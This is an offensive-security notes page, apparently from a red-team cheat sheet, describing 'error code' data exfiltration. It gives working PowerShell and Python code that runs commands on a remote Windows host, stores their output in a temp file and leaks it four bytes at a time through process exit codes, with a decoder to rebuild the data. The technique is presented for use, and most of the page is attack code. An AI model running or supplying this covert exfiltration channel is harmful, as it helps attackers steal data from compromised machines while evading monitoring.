# Esoteric Data Exfiltration

This is a dumping for less common but still quite interesting exfiltration methods.  These probably won't be too useful in anything but the most specific instances, but who knows, they might fit what you're looking for.

## Error Codes

We can exfiltrate arbitrary data via literally nothing but error-codes.  Here I'll walk through the stages to set up and test this for exfiltrating some file.

An error code can have a maximum length of 32 bits, or 4 bytes.  We can therefore encode 4 arbitrary bytes within the return of a windows command.

We have data stored within`$env:temp/merror.txt`  and the only parameter we need to know is it's length.  We can run an arbitrary command, store it's output in the file and find out its length by running the following:

```powershell
$command = (Invoke-Command -ScriptBlock {{{0}}} | Out-String).TrimStart().TrimEnd(); $command | Out-File $env:temp/merror.txt -encoding ASCII ;exit $command.length'.format(command)
```

We now have to generate our commands to split up the file and return the data.  The following script will return an iterator that will yield commands to run on the remote machine, which will return error codes.

```py
def error_exfil(output_length):
    output_length = int(output_length)
    for start in range(0, int(output_length), 4):
        if (output_length - start) < 4:
            amount_to_fetch = output_length-start
        else:
            amount_to_fetch = "4"
        run_cmd = '$fs = Get-Content $env:temp/merror.txt -Encoding Byte -ReadCount 0; $bytearray = $fs[{0}..{1}]; $hex = [System.BitConverter]::ToString($bytearray) -replace \'-\',\'\';\
echo $hex; exit ([convert]::ToInt32($hex, 16));'.format(start, int(start)+int(amount_to_fetch)-1)
        yield run_cmd
```

Decoding them on the other end is as simple as:

```py
def decode_error(errorval):
    val = hex(int(errorval))[2:]
    if len(val)%2 !=0:
        val = '0'+ val

    return val.decode('hex')
```



